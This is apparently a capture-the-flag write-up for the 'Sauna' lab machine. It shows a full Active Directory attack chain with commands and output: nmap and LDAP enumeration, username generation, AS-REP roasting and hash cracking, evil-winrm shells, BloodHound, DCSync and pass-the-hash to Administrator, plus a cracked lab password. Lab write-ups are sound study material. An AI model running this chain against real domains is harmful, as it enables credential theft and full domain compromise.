# Sauna

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.180
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 07:23 EDT
Nmap scan report for 10.129.95.180
Host is up (0.0067s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49685/tcp open  unknown
49692/tcp open  unknown
```

Let's investigate port 80.

### SMB + LDAP Enum

`enum4linux` reveals nothing. However, an `nmap` scan to enumerate LDAP does reveal the domain to us.

```
$ sudo nmap -n -sV --script "ldap* and not brute" 10.129.95.180
<TRUNCATED>
|    namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
<TRUNCATED>
```

It seems the domain is `EGOTISTICAL-BANK.LOCAL`.&#x20;

### Bank Usernames --> ASREP-Roast

This was a bank company website:

<figure><img src="../../../.gitbook/assets/image (1511).png" alt=""><figcaption></figcaption></figure>

At the bottom, we can 'Meet The Team':

<figure><img src="../../../.gitbook/assets/image (4020).png" alt=""><figcaption></figcaption></figure>

Using these names, we can make use of `usernamer.py` to generate possible usernames for the machine:

{% embed url="https://github.com/jseidl/usernamer" %}

```
$ cat names
Fergus Smith
Shaun Coins
Hugo Bear
Steven Kerb
Sophie Driver
$ python2 username.py -f names > usernames 
```

We can use `getNPUsers.py` with our possible usernames and see if we get a hash.

```bash
$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.95.180 -usersfile usernames -outputfile hashes.asreproast
$ cat hashes.asreproast                                                      
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:7ac0145923447530e79be08f93e8811d$28d6b94831b87f4d9c00e25616b535937cf88fd35efb8bb94f6864eb12af8ccab559ed7ffc31fddd4a26ebb92d9d30b423d6f9845361b96447d0f3a5c6136331f803243a524696d8dac90642c59ced66b80ca592b993be97a764ad526f32314b13feedc91b81f6a514cad6bc36ee331fd985b057f3a4b826263478da4fe716811f479e900a2fca3598dd027fffc56ad6889287e1a87868d369ac05ce9560526d043d5573d246bf7611d5ebc73dea412c30a54fa6d4e8601274c347258b59f333a794dbbc5ccc7ba92fce785b32d895435940cd8bfcd28f36ac1cae57891ea2e8f1328a4196ab383d82a89d4c5539700669ea7c4eb877c17817090e2b2a5eef72
```

We can crack this hash easily.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:06 DONE (2023-05-06 07:32) 0.1650g/s 1739Kp/s 1739Kc/s 1739KC/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Afterwards, we can get a shell using `evil-winrm`.

<figure><img src="../../../.gitbook/assets/image (2979).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### AutoLogon Creds

I ran a WinPEAS scan to enumerate for me. There, I found some AutoLogon credentials for the user.

<figure><img src="../../../.gitbook/assets/image (2550).png" alt=""><figcaption></figcaption></figure>

We can login as this user using `evil-winrm`, but there's not much there for us.

### BloodHound

I enumerated the system using BloodHound using FSmith credentials.

```
$ bloodhound-python -u fsmith -p Thestrokes23 -d egotistical-bank.local -ns 10.129.95.180 -c all --dns-tcp
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
WARNING: Failed to get service ticket for SAUNA.EGOTISTICAL-BANK.LOCAL, falling back to NTLM auth
WARNING: DCE/RPC connection failed: [Errno 2] No such file or directory: 'Administrator.ccache'
INFO: Done in 00M 03S
```

After uploading the data, we can see what privileges this user has, and find out that he has DCSync privileges over the DC.

<figure><img src="../../../.gitbook/assets/image (2117).png" alt=""><figcaption></figcaption></figure>

This means we can use `secretsdump.py` to read the hashes of the entire machine.&#x20;

<figure><img src="../../../.gitbook/assets/image (4025).png" alt=""><figcaption></figcaption></figure>

Then, just pass the hash using `evil-winrm` to get an administrator shell.

<figure><img src="../../../.gitbook/assets/image (1350).png" alt=""><figcaption></figcaption></figure>
